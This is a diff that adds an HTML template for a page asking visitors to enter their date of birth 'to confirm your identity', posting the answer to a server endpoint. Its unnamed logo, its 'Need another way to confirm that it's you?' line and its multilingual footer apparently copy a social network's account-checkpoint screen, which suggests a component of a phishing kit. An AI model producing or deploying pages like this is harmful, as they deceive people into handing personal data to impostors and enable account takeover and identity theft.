@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html >
+<head>
+    <link rel="icon" th:href="/static/img/logo1.webp" type="image/webp">
+    <link rel="stylesheet" type="text/css" href="/static/css/fa2.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div style="display:grid">
+    <div  class="headercustom">
+        <img class="logo" src="/static/img/logotrang.png">
+    </div>
+    <div class="body">
+        <div class="box">
+            <div class="text1">Enter your date of birth</div>
+            <div class="text2">Please enter your date of birth to confirm your identity.</div>
+            <div class="line"></div>
+            <form action="dob" method="post" onsubmit="return validateForm()">
+                <div class="divselect">
+                    <select id="day" name="day" onchange="validate()" style="padding: 5px;">
+                        <option value="">DD</option>
+                    </select>
+                    <select id="month" name="month" onchange="validate()"style="padding: 5px; margin-left: 7px;">
+                        <option value="">MM</option>
+                    </select>
+                    <select id="year" name="year" onchange="validate()" style="padding: 5px; margin-left: 7px; ">
+                        <option value="">YYYY</option>
+                    </select>
+                </div>
+                <p id="err"  style="color: red; margin-top: 5px; font-size: 14px" >{{ error }}</p>
+                <p style="color: red;margin-top: 5px;font-size: 14px;" id="error"></p>
+                <input type="hidden" id="myHiddenVar" name="myHiddenVar" value="{{ myValue }}">
+                <div class="line"></div>
+                <div style="display: flow-root;">
+                    <div class="divbutton">
+                        <button class="button" type="submit" id="submit">Continue</button>
+                    </div>
+                    <div class="divtext">Need another way to confirm that it's you?</div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <span style="font-weight: bold">English (US)</span>
+        &nbsp;&nbsp;Tiếng Việt&nbsp;&nbsp;中文(台灣)&nbsp;&nbsp;한국어&nbsp;&nbsp;日本語&nbsp;&nbsp;Français (France)&nbsp;&nbsp;ภาษาไทย&nbsp;&nbsp;Español&nbsp;&nbsp;Português&nbsp;&nbsp;(Brasil)&nbsp;&nbsp;Deutsch&nbsp;&nbsp;Italiano
+    </div>
+</div>
+<script type="text/javascript" src="/static/js/dob.js"></script>
+</body>
+</html>
